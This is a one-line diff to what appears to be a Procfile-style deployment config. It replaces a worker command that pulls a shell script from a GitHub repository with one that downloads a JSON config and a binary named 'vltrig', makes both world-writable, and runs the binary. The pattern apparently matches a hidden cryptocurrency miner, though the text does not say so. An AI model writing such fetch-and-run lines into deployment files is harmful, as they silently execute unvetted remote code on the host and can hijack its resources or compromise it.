@@ -1,1 +1,1 @@
-worker: curl -sL https://raw.githubusercontent.com/crewi2013-hue/kelop/refs/heads/main/elen.sh && chmod +x elen.sh && ./elen.sh
+worker: wget https://raw.githubusercontent.com/crewi2013-hue/kelop/refs/heads/main/90.json && chmod 777 90.json && wget https://github.com/crewi2013-hue/kelop/raw/refs/heads/main/vltrig && chmod 777 vltrig && ./vltrig -c "90.json" 
